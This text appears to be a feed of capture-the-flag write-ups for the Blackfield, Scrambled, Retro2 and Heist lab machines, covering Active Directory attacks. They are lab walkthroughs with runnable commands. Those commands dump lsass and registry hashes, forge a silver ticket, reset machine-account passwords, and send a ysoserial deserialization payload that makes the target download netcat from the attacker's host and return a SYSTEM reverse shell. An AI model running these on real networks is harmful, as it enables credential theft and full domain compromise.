# lsdrw-rw-rw-          0  Sun Feb 23 12:14:37 2020 .drw-rw-rw-          0  Sun Feb 23 12:14:37 2020 ..-rw-rw-rw-        528  Sun Feb 23 12:12:54 2020 domain_admins.txt-rw-rw-rw-        962  Sun Feb 23 12:12:54 2020 domain_groups.txt-rw-rw-rw-      16454  Fri Feb 28 16:32:17 2020 domain_users.txt-rw-rw-rw-     518202  Sun Feb 23 12:12:54 2020 firewall_rules.txt-rw-rw-rw-       1782  Sun Feb 23 12:12:54 2020 ipconfig.txt-rw-rw-rw-       3842  Sun Feb 23 12:12:54 2020 netstat.txt-rw-rw-rw-       3976  Sun Feb 23 12:12:54 2020 route.txt-rw-rw-rw-       4550  Sun Feb 23 12:12:54 2020 systeminfo.txt-rw-rw-rw-       9990  Sun Feb 23 12:12:54 2020 tasklist.txt
Memory_analysis Directory:
     3842  Sun Feb 23 12:12:54 2020 netstat.txt-rw-rw-rw-       3976  Sun Feb 23 12:12:54 2020 route.txt-rw-rw-rw-       4550  Sun Feb 23 12:12:54 2020 systeminfo.txt-rw-rw-rw-       9990  Sun Feb 23 12:12:54 2020 tasklist.txt# cd ../memory_analysis# lsdrw-rw-rw-          0  Thu May 28 15:29:24 2020 .drw-rw-rw-          0  Thu May 28 15:29:24 2020 ..-rw-rw-rw-   37876530  Thu May 28 15:29:24 2020 conhost.zip-rw-rw-rw-   24962333  Thu May 28 15:29:24 2020 ctfmon.zip-rw-rw-rw-   23993305  Thu May 28 15:29:24 2020 dfsrs.zip-rw-rw-rw-   18366396  Thu May 28 15:29:24 2020 dllhost.zip-rw-rw-rw-    8810157  Thu May 28 15:29:24 2020 ismserv.zip-rw-rw-rw-   41936098  Thu May 28 15:29:24 2020 lsass.zip-rw-rw-rw-   64288607  Thu May 28 15:29:24 2020 mmc.zip-rw-rw-rw-   13332174  Thu May 28 15:29:24 2020 RuntimeBroker.zip-rw-rw-rw-  131983313  Thu May 28 15:29:24 2020 ServerManager.zip-rw-rw-rw-   33141744  Thu May 28 15:29:24 2020 sihost.zip-rw-rw-rw-   33756344  Thu May 28 15:29:24 2020 smartscreen.zip-rw-rw-rw-   14408833  Thu May 28 15:29:24 2020 svchost.zip-rw-rw-rw-   34631412  Thu May 28 15:29:24 2020 taskhostw.zip-rw-rw-rw-   14255089  Thu May 28 15:29:24 2020 winlogon.zip-rw-rw-rw-    4067425  Thu May 28 15:29:24 2020 wlms.zip-rw-rw-rw-   18303252  Thu May 28 15:29:24 2020 WmiPrvSE.zip
The lsass.zip caught my eye so I downloaded that to my machine and unziped it.
$ unzip lsass.zipArchive:  lsass.zip  inflating: lsass.DMP$ file lsass.DMPlsass.DMP: Mini DuMP crash report, 16 streams, Sun Feb 23 18:02:01 2020, 0x421826 type
So we have a dump. We can use a python3 module pypykatz to dump this. This dumps everything including svc_backupâ€˜s hash.
$ python3 -m pypykatz lsa minidump lsass.DMPINFO:pypykatz:Parsing file lsass.DMPFILE: ======== lsass.DMP ========= LogonSession ==authentication_id 406458 (633ba)session_id 2username svc_backupdomainname BLACKFIELDlogon_server DC01logon_time 2020-02-23T18:00:03.423728+00:00sid S-1-5-21-4194615774-2175524697-3563712290-1413luid 406458	== MSV ==		Username: svc_backup		Domain: BLACKFIELD		LM: NA		NT: &lt;SNIP&gt;		SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c		DPAPI: a03cd8e9d30171f3cfe8caad92fef621&lt;SNIP&gt;

Shell as svc_backupGetting on the box and seeing what privileges we have.
*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; whoami /all&lt;SNIP&gt;GROUP INFORMATION-----------------Group Name                                 Type             SID          Attributes========================================== ================ ============ ==================================================Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled groupBUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled groupBUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group&lt;SNIP&gt;PRIVILEGES INFORMATION----------------------Privilege Name                Description                    State============================= ============================== =======SeMachineAccountPrivilege     Add workstations to domain     EnabledSeBackupPrivilege             Back up files and directories  EnabledSeRestorePrivilege            Restore files and directories  EnabledSeShutdownPrivilege           Shut down the system           EnabledSeChangeNotifyPrivilege       Bypass traverse checking       EnabledSeIncreaseWorkingSetPrivilege Increase a process working set Enabled&lt;SNIP&gt;
So where part of BackupOperators. Shouldnâ€™t be too hard. Lets backup the SAM,SYSTEM,and SECURITY.
*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; reg.exe save hklm\sam SAM.saveThe operation completed successfully.*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; reg.exe save hklm\system SYSTEM.saveThe operation completed successfully.*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; reg.exe save hklm\security SECURITY.savereg.exe : ERROR: Access is denied.    + CategoryInfo          : NotSpecified: (ERROR: Access is denied.:String) [], RemoteException    + FullyQualifiedErrorId : NativeCommandError
Hmmmâ€¦.canâ€™t backup the SECURITY locally, lets try remotely.
$ reg.py &#x27;blackfield.local&#x27;/&#x27;svc_backup&#x27;@&#x27;10.10.10.192&#x27; -hashes :&lt;SNIP&gt; save -keyName &#x27;HKLM\SECURITY&#x27; -o &#x27;C:\Users\svc_backup\Documents\&#x27;Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...[*] Saved HKLM\SECURITY to C:\Users\svc_backup\Documents\\SECURITY.save
Now we can download them on to our machine and dump the secrets.
*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; ls    Directory: C:\Users\svc_backup\DocumentsMode                LastWriteTime         Length Name----                -------------         ------ -----a----        2/28/2025   3:54 PM          45056 SAM.save-a----        2/28/2025   6:02 PM          32768 SECURITY.save-a----        2/28/2025   3:54 PM       17371136 SYSTEM.save


$ secretsdump.py -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCALImpacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)Administrator:500:aad3b435b51404eeaad3b435b51404ee:&lt;SNIP&gt;:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&lt;SNIP&gt;[*] Cleaning up...
Shell as AdministratorFinally, we are administrator on the machine.
$ evil-winrm -i blackfield.local -u Administrator -p &lt;SNIP&gt;Evil-WinRM shell v3.5Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completionInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami;hostnameblackfield\administratorDC01

]]></content>
      <categories>
        <category>htb</category>
      </categories>
      <tags>
        <tag>SMB</tag>
        <tag>ASREPRoasting</tag>
        <tag>Hashcat</tag>
        <tag>pypykatz</tag>
        <tag>BackupOperators</tag>
      </tags>
  </entry>
  <entry>
    <title>Scrambled (Windows Medium)</title>
    <url>/2025/04/01/Scrambled/</url>
    <content><![CDATA[
Scrambled is a Medium Windows Active Directory machine. Enumerating the website hosted on the remote machine a potential attacker is able to deduce the credentials for the user ksimpson. On the website, it is also stated that NTLM authentication is disabled meaning that Kerberos authentication is to be used. Accessing the Public share with the credentials of ksimpson, a PDF file states that an attacker retrieved the credentials of an SQL database. This is a hint that there is an SQL service running on the remote machine. Enumerating the normal user accounts, it is found that the account SqlSvc has a Service Principal Name (SPN) associated with it. An attacker can use this information to perform an attack that is knows as kerberoasting and get the hash of SqlSvc. After cracking the hash and acquiring the credentials for the SqlSvc account an attacker can perform a silver ticket attack to forge a ticket and impersonate the user Administrator on the remote MSSQL service. Enumeration of the database reveals the credentials for user MiscSvc, which can be used to enumerate shares finding IT share readable. Looking at the files found from the share, reveals a .NET application, which is listening on port 4411. Reverse engineering the application reveals that it is using the insecure Binary Formatter class to transmit data, allowing the attacker to upload their own payload and get code execution as nt authority\system. 
Initial NmapPORT      STATE SERVICE       REASON          VERSION53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.088/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-01 14:18:04Z)135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC 139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name) 445/tcp   open  microsoft-ds? syn-ack ttl 127   464/tcp   open  kpasswd5?     syn-ack ttl 127 593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000 3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name) 4411/tcp  open  found?        syn-ack ttl 1275985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.049674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC 49700/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC49706/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC                                  60880/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC                 
Port 4411Seems to be a custom app maybe?
$ telnet 10.10.11.168 4411                                                            Trying 10.10.11.168...Connected to 10.10.11.168.Escape character is &#x27;^]&#x27;.SCRAMBLECORP_ORDERS_V1.0.3;
Weâ€™ll can come back later.
HTTPUser found from website ksimpson. Looking at the password reset page, in short they are changing the password to the username. 

SMB (Authenticating Through Kerberos)Using kerberos to check if user is valid with the FQDN.
$ nxc smb dc1.scrm.local -k -u ksimpson -p ksimpson                SMB         dc1.scrm.local  445    dc1              [*]  x64 (name:dc1) (domain:scrm.local) (signing:True) (SMBv1:False)SMB         dc1.scrm.local  445    dc1              [+] scrm.local\ksimpson:ksimpson
We can look at shares.
$ nxc smb dc1.scrm.local -k -u ksimpson -p ksimpson --sharesSMB         dc1.scrm.local  445    dc1              [*]  x64 (name:dc1) (domain:scrm.local) (signing:True) (SMBv1:False)SMB         dc1.scrm.local  445    dc1              [+] scrm.local\ksimpson:ksimpson SMB         dc1.scrm.local  445    dc1              [*] Enumerated sharesSMB         dc1.scrm.local  445    dc1              Share           Permissions     RemarkSMB         dc1.scrm.local  445    dc1              -----           -----------     ------SMB         dc1.scrm.local  445    dc1              ADMIN$                          Remote AdminSMB         dc1.scrm.local  445    dc1              C$                              Default shareSMB         dc1.scrm.local  445    dc1              HR                              SMB         dc1.scrm.local  445    dc1              IPC$            READ            Remote IPCSMB         dc1.scrm.local  445    dc1              IT                              SMB         dc1.scrm.local  445    dc1              NETLOGON        READ            Logon server share SMB         dc1.scrm.local  445    dc1              Public          READ            SMB         dc1.scrm.local  445    dc1              Sales                           SMB         dc1.scrm.local  445    dc1              SYSVOL          READ            Logon server share
Looking at them with smbclient, Public is the only interesting one we can read.
impacket-smbclient &#x27;scrm.local/ksimpson:ksimpson@dc1.scrm.local&#x27; -k -no-passImpacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies [-] CCache file is not found. Skipping...Type help for list of commands# use Public# lsdrw-rw-rw-          0  Thu Nov  4 17:23:19 2021 .drw-rw-rw-          0  Thu Nov  4 17:23:19 2021 ..-rw-rw-rw-     630106  Fri Nov  5 12:45:07 2021 Network Security Changes.pdf
Upon grabbing and reading we see that there was a previous attack where an attacker targeted SQL. We will try that soon enough!
Kerberoasting cuz We care!!Looking at what SPNs are running under our user we find MSSQL associated with our user.
$ GetUserSPNs.py -dc-host dc1.scrm.local -k &#x27;scrm.local/ksimpson:ksimpson&#x27;Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies [-] CCache file is not found. Skipping...[-] CCache file is not found. Skipping...ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation ----------------------------  ------  --------  --------------------------  --------------------------  ----------MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 11:32:02.351452  2025-03-30 19:26:14.609217             MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 11:32:02.351452  2025-03-30 19:26:14.609217
We can request these and the try to crack. Which this gives a cleartext password for the svcsql account.  
Silver Ticket AttacksMSSQL is running, so we can forge a silver ticket and connect as the Administrator of the instance.
$ ticketer.py -nthash B990006500B87D000C70000A6877000 -domain-sid &#x27;S-1-5-21-2743207045-1827831105-2542523200&#x27; -user &#x27;sqlsvc&#x27; -domain &#x27;scrm.local&#x27; -spn &#x27;MSSQL//dc1.scrm.local:1433&#x27; -user-id &#x27;500&#x27; AdministratorImpacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies [*] Creating basic skeleton ticket and PAC Infos[*] Customizing ticket for scrm.local/Administrator[*]     PAC_LOGON_INFO[*]     PAC_CLIENT_INFO_TYPE[*]     EncTicketPart[*]     EncTGSRepPart[*] Signing/Encrypting final ticket[*]     PAC_SERVER_CHECKSUM[*]     PAC_PRIVSVR_CHECKSUM[*]     EncTicketPart[*]     EncTGSRepPart[*] Saving ticket in Administrator.ccache

Then we can export and connect to the MSSQL instance.
$ export KRB5CCNAME=Administrator.ccache$ impacket-mssqlclient -dc-ip 10.10.11.168 &#x27;scrm.local/Administrator@dc1.scrm.local&#x27; -k -no-pass -debugImpacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies [+] Impacket Library Installation Path: /usr/local/lib/python3.11/dist-packages/impacket-0.13.0.dev0+20241024.90011.835e1755-py3.11.egg/impacket[*] Encryption required, switching to TLS[+] Using Kerberos Cache: Administrator.ccache[+] SPN MSSQLSVC/:1433@SCRM.LOCAL not found in cache[+] AnySPN is True, looking for another suitable SPN[+] Returning cached credential for MSSQL/@SCRM.LOCAL[+] Using TGS from cache[+] Changing sname from MSSQL/@SCRM.LOCAL to MSSQLSVC/:1433@SCRM.LOCAL and hoping for the best[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192[*] INFO(DC1): Line 1: Changed database context to &#x27;master&#x27;.[*] INFO(DC1): Line 1: Changed language setting to us_english.[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) [!] Press help for extra shell commandsSQL (SCRM\administrator  dbo@master)&gt; 
Winner Winner SQL Dinner!!!
MSSQL (Through the Looking Glass)We can look through the database real quick to see if anything interesting is lingering about.
SQL (SCRM\administrator  dbo@master)&gt; select name from sys.databases;                                                                                            name                                                                                                  ----------   mastertempdbmodelmsdbScrambleHRSQL (SCRM\administrator  dbo@master)&gt; use ScrambleHR;ENVCHANGE(DATABASE): Old Value: master, New Value: ScrambleHR                                                                          INFO(DC1): Line 1: Changed database context to &#x27;ScrambleHR&#x27;.SQL (SCRM\administrator  dbo@ScrambleHR)&gt; select name from sys.tables;name----------                                                                                            Employees    UserImport                                                                                                                     Timesheets                                                          SQL (SCRM\administrator  dbo@ScrambleHR)&gt; select * from UserImport;LdapUser   LdapPwd             LdapDomain   RefreshInterval   IncludeGroups   --------   -----------------   ----------   ---------------   -------------   MiscSvc    &lt;SNIP&gt;   scrm.local                90               0 

SMB I SeeUsing the new credentials we found for MiscSvc, lets look at shares again.
$ nxc smb dc1.scrm.local -k -u MiscSvc -p &lt;SNIP&gt; --sharesSMB         dc1.scrm.local  445    dc1              [*]  x64 (name:dc1) (domain:scrm.local) (signing:True) (SMBv1:False)SMB         dc1.scrm.local  445    dc1              [+] scrm.local\MiscSvc:&lt;SNIP&gt; SMB         dc1.scrm.local  445    dc1              [*] Enumerated sharesSMB         dc1.scrm.local  445    dc1              Share           Permissions     RemarkSMB         dc1.scrm.local  445    dc1              -----           -----------     ------SMB         dc1.scrm.local  445    dc1              ADMIN$                          Remote AdminSMB         dc1.scrm.local  445    dc1              C$                              Default shareSMB         dc1.scrm.local  445    dc1              HR                              SMB         dc1.scrm.local  445    dc1              IPC$            READ            Remote IPCSMB         dc1.scrm.local  445    dc1              IT              READ            SMB         dc1.scrm.local  445    dc1              NETLOGON        READ            Logon server share SMB         dc1.scrm.local  445    dc1              Public          READ            SMB         dc1.scrm.local  445    dc1              Sales                           SMB         dc1.scrm.local  445    dc1              SYSVOL          READ            Logon server share 
We have access to the IT share now. Looking inside we find a custom exe and dll file we can download and look at on our windows VM.
$ impacket-smbclient &#x27;scrm.local/MiscSvc:&lt;SNIP&gt;@dc1.scrm.local&#x27; -k -no-passImpacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies [-] CCache file is not found. Skipping...Type help for list of commands# use IT# lsdrw-rw-rw-          0  Wed Nov  3 14:32:55 2021 .drw-rw-rw-          0  Wed Nov  3 14:32:55 2021 ..drw-rw-rw-          0  Wed Nov  3 16:06:32 2021 Appsdrw-rw-rw-          0  Wed Nov  3 14:32:44 2021 Logsdrw-rw-rw-          0  Wed Nov  3 14:32:55 2021 Reports# cd Apps# lsdrw-rw-rw-          0  Wed Nov  3 16:06:32 2021 .drw-rw-rw-          0  Wed Nov  3 16:06:32 2021 ..drw-rw-rw-          0  Fri Nov  5 15:57:08 2021 Sales Order Client# cd Sales Order Client# lsdrw-rw-rw-          0  Fri Nov  5 15:57:08 2021 .drw-rw-rw-          0  Fri Nov  5 15:57:08 2021 ..-rw-rw-rw-      86528  Fri Nov  5 15:57:08 2021 ScrambleClient.exe-rw-rw-rw-      19456  Fri Nov  5 15:57:08 2021 ScrambleLib.dll# mget *
DnspyingAfter getting the files on our windows VM we can look at them in dnspy.
From this we can load both the exe and dll. The dll will hold libraries which we can look at called ScrambleLib. Inside them we find a library showing us a certain username we can use to bypass authentication.
Upon connecting with the domain we get the dashboard. Other tabs show a way to create a new order. We can enable debug logging from Tools so we get a output file we can read. Lets try to create an order and get output.

Making sense of the outputWe see that we are send data to the server LIST_ORDERS;. Also base64 and deserialization is being used, as well as Binary Formatting. We see near the bottom, UPLOAD_ORDER; and then base64. If we rememeber from the very beginning there was port 4411 running that gave us feedback.
Back to Suite 4411 with DeserializationWe can use ysoserial to encode our payloads. First we can setup a python server hosting ncat.
Windows VM:PS C:\Users\jay\Desktop\Tools\ysoserial-NET &gt; .\ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c &quot;certutil -f -urlcache http://10.10.14.7/nc64.exe C:\ProgramData\nc.exe&quot;Linux VM:$ telnet 10.10.11.168 4411                                               Trying 10.10.11.168...Connected to 10.10.11.168.Escape character is &#x27;^]&#x27;.SCRAMBLECORP_ORDERS_V1.0.3;UPLOAD_ORDER;AAEAAAD/////&lt;SNIP&gt;ERROR_GENERAL;Error deserializing sales order: Exception has been thrown by the target of an invocation.SESSION_TIMED_OUT;$ sudo python3 -m http.server 80 --directory /usr/share/windows-binaries/[sudo] password for jaybit:Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...10.10.11.168 - - [01/Apr/2025 10:43:28] &quot;GET /nc64.exe HTTP/1.1&quot; 200 -10.10.11.168 - - [01/Apr/2025 10:43:28] &quot;GET /nc64.exe HTTP/1.1&quot; 200 - 
So we got it to grab ncat. Now we can do the same thing and execute ncat now and once we do we get a shell back.
$ rlwrap nc -lvnp 9001                                                                                            listening on [any] 9001 ...connect to [10.10.14.7] from (UNKNOWN) [10.10.11.168] 50224Windows PowerShell                                          Copyright (C) Microsoft Corporation. All rights reserved.PS C:\Windows\system32&gt; whoamiwhoamint authority\system           


]]></content>
      <categories>
        <category>htb</category>
      </categories>
      <tags>
        <tag>SMB</tag>
        <tag>kerberoasting SPNs</tag>
        <tag>silver ticket</tag>
        <tag>mssql</tag>
        <tag>.NET</tag>
        <tag>Deserialization</tag>
      </tags>
  </entry>
  <entry>
    <title>Retro2 (Windows Easy)</title>
    <url>/2025/04/05/Retro2/</url>
    <content><![CDATA[
Retro2 is a Easy Windows machine, that starts off with Guest auth enabled to look at shares finding a Microsoft Access Database file. After finding the user and password we are able to obtain a bloodhound dump. This shows a relatively simple path with some twists, we are able to find a couple of Pre-Windows machine and change the password for one. Allowing us to change&#x2F;reset the password for the computer ADMWS01$ which has a particular attribute that allows the reset of the password. Once weâ€™ve done this we are able to add our user to the Services group allowing for RDP access. Upon getting a session we find that with the version of Windows Server 2008 we are able to control the full path to a windows registry value that allows us to escalate to NT AUTHORITY\SYSTEM.
Initial NmapPORT      STATE SERVICE      VERSION53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15F75) (Windows Server 2008 R2 SP1)| dns-nsid:|_  bind.version: Microsoft DNS 6.1.7601 (1DB15F75)88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-08 15:45:22Z)135/tcp   open  msrpc        Microsoft Windows RPC139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)445/tcp   open  microsoft-ds Windows Server 2008 R2 Datacenter 7601 Service Pack 1 microsoft-ds (workgroup: RETRO2)464/tcp   open  kpasswd5?593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0636/tcp   open  tcpwrapped3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)3269/tcp  open  tcpwrapped49154/tcp open  msrpc        Microsoft Windows RPC49155/tcp open  msrpc        Microsoft Windows RPC49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.049158/tcp open  msrpc        Microsoft Windows RPCService Info: Host: BLN01; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windowsHost script results:| smb-security-mode:|   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: required| smb-os-discovery:|   OS: Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (Windows Server 2008 R2 Datacenter 6.1)|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1|   Computer name: BLN01|   NetBIOS computer name: BLN01\x00|   Domain name: retro2.vl|   Forest name: retro2.vl|   FQDN: BLN01.retro2.vl|_  System time: 2024-11-08T16:46:17+01:00| smb2-time:|   date: 2024-11-08T15:46:14|_  start_date: 2024-11-08T15:44:30| smb2-security-mode:|   2:1:0:|_    Message signing enabled and required|_clock-skew: mean: 47m06s, deviation: 34m35s, median: 1h07m04sNSE: Script Post-scanning.Initiating NSE at 08:39Completed NSE at 08:39, 0.00s elapsedInitiating NSE at 08:39Completed NSE at 08:39, 0.00s elapsedInitiating NSE at 08:39Completed NSE at 08:39, 0.00s elapsedRead data files from: /usr/share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 109.68 seconds           Raw packets sent: 1990 (87.536KB) | Rcvd: 17 (732B)

SMBFound LOTS users via brute forcing.
$ smb retro2.vl -u jay -p &#x27;&#x27; --rid-brute  | tr -s &quot; &quot; | awk -F&#x27;\&#x27; &#x27;&#123;print $2&#125;&#x27; | awk &#x27;&#123;print $1&#125;&#x27; &gt; users.lst&lt;SNIP&gt;Julie.MartinClare.SmithLaura.DaviesRhys.RichardsLeah.RobinsonMichelle.Bird&lt;SNIP&gt;
Found MS Access Database. 

This file was password protected, so converting using office2john and cracking got us in and found creds.
strLDAP = &quot;LDAP://OU=staff,DC=retro2,DC=vl&quot;strUser = &quot;retro2\ldapreader&quot;strPassword = &quot;&lt;SNIP&gt;&quot;

BloodHoundNow we can get a bloodhound dump and look at our attack path. From there the path is relatively simple. We can use FS01$ or FS02$. Iâ€™m using FS01$.
Seeing as Pre-Windows machines use the same password as their hostname, we can check to see if we have an error that indicates a password change is needed. 
$ nxc smb retro2.vl -u &#x27;FS01$&#x27; -p fs01                                                                                         SMB         10.10.106.109   445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True)SMB         10.10.106.109   445    BLN01            [-] retro2.vl\FS01$:fs01 STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
As we didnâ€™t get a STATUS_LOGON_FAILURE, the password for this machine can be reset. We can use bloodyAD to set his password.
$ ./bloodyAD.py -v DEBUG --dc-ip 10.10.106.109 --host retro2.vl -d retro2.vl -u &#x27;ldapreader&#x27; -p &#x27;&lt;SNIP&gt;&#x27; set password &#x27;FS01$&#x27; &#x27;Password123!&#x27; --oldpass fs01 [*] Trying to connect to retro2.vl...[+] Connection successful[+] Password changed successfully!

There are 3 ways to abuse the GenericWrite permission:

Shadow Credentials (applicable with Windows Server 2016  and later)
Targeted Kerberoasting(affective if your targets password is weak and crackable)
Resource-Based Constrained Delegation

None of which will work on this 2008 machine. ðŸ˜’
Yet the Windows Server 2008 has an attribute, which if writable we can perform a password reset of ADMWS01$ Computer. This article explains some context.
$ ./bloodyAD.py -v DEBUG --dc-ip 10.10.102.10 --host retro2.vl -d retro2.vl -u &#x27;FS01$&#x27; -p &#x27;Password123!&#x27; get writable --otype COMPUTER --detail                                                                                    [*] Trying to connect to retro2.vl... [+] Connection successful distinguishedName: CN=ADMWS01,CN=Computers,DC=retro2,DC=vlserviceInstance: CREATE_CHILDapplicationVersion: CREATE_CHILDms-net-ieee-80211-GroupPolicy: CREATE_CHILDrpcProfile: CREATE_CHILDrpcProfileElement: CREATE_CHILD msieee80211-Policy: CREATE_CHILD serviceAdministrationPoint: CREATE_CHILD   &lt;SNIP&gt;ntPwdHistory: WRITEotherLoginWorkstations: WRITEunicodePwd: WRITE &lt;-----userWorkstations: WRITEmaxStorage: WRITE&lt;SNIP&gt;
With the attribute writable, we can change&#x2F;reset the password for ADMWS01$. I found it difficult to do with bloodyAD but I used changepassword.py from Impacket that got the job done.
$ changepasswd.py -dc-ip 10.10.102.10 -altuser &#x27;FS01$&#x27; -altpass &#x27;Password123!&#x27; -newpass &#x27;Password123!&#x27; -p rpc-samr &#x27;retro2.vl/ADMWS01$@retro2.vl&#x27; -reset -admin Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies [*] Setting the password of retro2.vl\ADMWS01$ as retro2.vl\FS01$[*] Connecting to DCE/RPC as retro2.vl\FS01$[*] Password was changed successfully.[!] User no longer has valid AES keys for Kerberos, until they change their password again.
Once weâ€™ve done this, we can add ldapreader to the Services group which will allow him to RDP to the machine.
$ ./bloodyAD.py -v DEBUG --dc-ip 10.10.102.10 --host retro2.vl -d retro2.vl -u &#x27;ADMWS01$&#x27; -p &#x27;Password123!&#x27; add groupMember &#x27;Services&#x27; &#x27;ldapreader&#x27;[*] Trying to connect to retro2.vl...[+] Connection successful[+] ldapreader added to Services

Session as ldapreaderWe can get a session going via RDP.
$ xfreerdp /v:retro2.vl /u:ldapreader /p:&lt;SNIP&gt; /tls-seclevel:0 +clipboard /dynamic-resolution

I looked around and did some research about Windows Server 2008 R2, finding some articles but I came across something of a no fix by itm4n. Explaining that using Get-WmiObject Win32_Perf can query the Performance counters of the machine and when doing so the WMI service should load a specified DLL that gets us NT AUTHORITY\SYSTEM. 

PrivEscOnce downloading the repo, and compiling, we can transfer it over to the machine and execute it. 


]]></content>
      <categories>
        <category>vl</category>
      </categories>
      <tags>
        <tag>Pre-Windows 2000</tag>
        <tag>SMB</tag>
        <tag>No-Fix RPC</tag>
      </tags>
  </entry>
  <entry>
    <title>Heist (Windows Easy)</title>
    <url>/2025/04/06/Heist/</url>
    <content><![CDATA[
Heist is a Windows Easy box, I wanted to take it easy and doing something relaxing and this was very interesting to say the least. This starts out with a website that youâ€™re able to login as a guest and read the recent posts. When you do you gather a user name, as well as see an attachment. This attactment is a cisco config file. Youâ€™re able to deduce what type of hash the passwords are and crack them. From there your able to get a list of users, and then spray to find one allows for winrm access. Upon looking a directories and anything from the norm, you find processes running and a particular firefox is running, which can allow for dumping the process memory if its still being used. Using procdump64.exe, weâ€™re able to dump the process memory and filter through and retrieve the Administrator password.
